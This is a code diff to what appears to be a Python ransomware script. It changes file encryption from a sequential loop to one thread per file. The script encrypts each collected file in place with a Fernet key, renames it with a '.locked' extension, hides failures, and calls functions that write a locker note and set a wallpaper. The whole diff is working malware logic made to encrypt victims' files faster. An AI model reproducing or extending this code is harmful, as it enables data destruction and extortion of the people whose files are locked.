@@ -19,6 +19,7 @@ import time
 import os
 import ntpath
 import sys
+from threading import Thread
 from cryptography.fernet import Fernet
 
 fileList = []
@@ -47,26 +48,25 @@ def GenKeyFile(keyfile):
     with open(keyfile, "wb") as kf:
         kf.write(key)
 
-def EncryptFiles(array, keyfile):
+def EncryptFile(file, keyfile):
     with open(keyfile, "rb") as kf:
         for data in kf:
             fernet = Fernet(data)
             
-    for file in array:
-        try:
-            with open(file, "rb") as f:
-                original = f.read()
+    try:
+        with open(file, "rb") as f:
+            original = f.read()
 
-            encrypted = fernet.encrypt(original)
+        encrypted = fernet.encrypt(original)
 
-            with open(file, "wb") as ef:
-                ef.write(encrypted)
+        with open(file, "wb") as ef:
+            ef.write(encrypted)
         
-            os.rename(file, file+".locked")
+        os.rename(file, file+".locked")
             
-        except:
-            pass
-            #print("File " +file+ " failed to encrypt")
+    except:
+        pass
+        #print("File " +file+ " failed to encrypt")
 
 def GenLockerNote(path):
     with open(path, "wt") as f:
@@ -128,8 +128,11 @@ fileList = list(dict.fromkeys(fileList)) # Remove duplicate entries
 GenKeyFile(keyfile)
 #print("Generated keyfile")
 
-EncryptFiles(fileList, keyfile)
+for file in fileList:
+    new_thread = Thread(target=EncryptFile, args=(file, keyfile))
+    new_thread.start()
 #print("Encrypted files")
+new_thread.join()
 
 SetWallpaper("wallpaper.jpg")
 #print("Set wallpaper")
